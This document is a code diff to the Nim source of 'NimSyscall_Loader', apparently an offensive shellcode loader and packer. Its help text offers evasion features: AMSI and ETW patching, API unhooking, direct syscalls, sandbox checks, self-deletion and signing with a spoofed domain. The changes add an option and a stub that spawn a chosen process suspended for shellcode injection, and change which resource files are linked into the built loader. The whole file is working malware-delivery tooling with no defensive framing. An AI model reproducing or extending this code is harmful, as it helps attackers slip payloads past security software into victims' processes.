@@ -57,7 +57,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.5
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --noRES --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --noRES --dll --dllexportfunc=<exportfuncname> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -117,10 +117,11 @@ Options:
 
   --shellcode    Encrypt shellcode to load it on runtime
   --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
-  --remoteprocess procname    Injects into the specified remote process name, e.g. teams.exe. The loader searches for the first process with that name
-                     Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
-  --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
-  --remotepatchETW    Patch ETW in the remote process before shellcode execution
+      --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
+      --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
+                         Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
+      --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
+      --remotepatchETW    Patch ETW in the remote process before shellcode execution
   
 [PE Packing]
 
@@ -151,6 +152,7 @@ var
     remoteprocesses : seq[string]
     targetdomain : string = ""
     processname: string = ""
+    customspawnprocess: string = "notepad.exe"
     sandboxcheckfmt: string = ""
     sandboxchecks: seq[string]
     sandbox: bool = false
@@ -247,14 +249,6 @@ if args["--output"]:
 if args["--noRES"]:
   noRES = false
 
-
-if args["--remoteprocess"]:
-  let remoteprocessesstring = args["--remoteprocess"]
-  processname = fmt"{remoteprocessesstring}"
-  echo processname
-  remoteprocesses = processname.split(',')
-  echo remoteprocesses
-
 if args["--remotepatchAMSI"]:
   remoteAMSIpatch = true
 
@@ -280,6 +274,17 @@ if args["--sleep"]:
 
 if args["--remoteinject"]:
   localinject = false
+
+if args["--customprocess"]:
+  let customprocargs = args["--customprocess"]
+  customspawnprocess = fmt"{customprocargs}"
+
+if args["--remoteprocess"]:
+  let remoteprocessesstring = args["--remoteprocess"]
+  processname = fmt"{remoteprocessesstring}"
+  echo processname
+  remoteprocesses = processname.split(',')
+  echo remoteprocesses
 
 if args["--reflective"]:
   reflective = true
@@ -878,6 +883,18 @@ let SleepyCryptLoopExecute = """
 SleepyCryptLoop(10000)
 """
 
+let NotepadProcIDStub * = fmt"""
+
+# Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
+let tProcess = startProcess(obf("{customspawnprocess}"))
+tProcess.suspend() # That's handy!
+tProcess.close()
+
+echo obf("[*] Target Process: "), tProcess.processID
+var remoteProcID = DWORD(tProcess.processID)
+
+"""
+
 var stub = Cryptstub1
 if (not noDInvoke):
     stub.add(DInvokeBaseStub)
@@ -1200,10 +1217,16 @@ elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 
 if (not noRES):
-    when system.hostOS == "windows":
-        basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\icores.o ")
+    if (dll_out):
+        when system.hostOS == "windows":
+            basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\dll.o ")
+        else:
+            basicCompileFlags.add(fmt"--passL:{packerPath}/resource/dll.o ")    
     else:
-        basicCompileFlags.add(fmt"--passL:{packerPath}/resource/icores.o ")
+        when system.hostOS == "windows":
+            basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\cmd.o ")
+        else:
+            basicCompileFlags.add(fmt"--passL:{packerPath}/resource/cmd.o ")
 
 if (compileX86):
     basicCompileFlags.add("--cpu:i386 ")
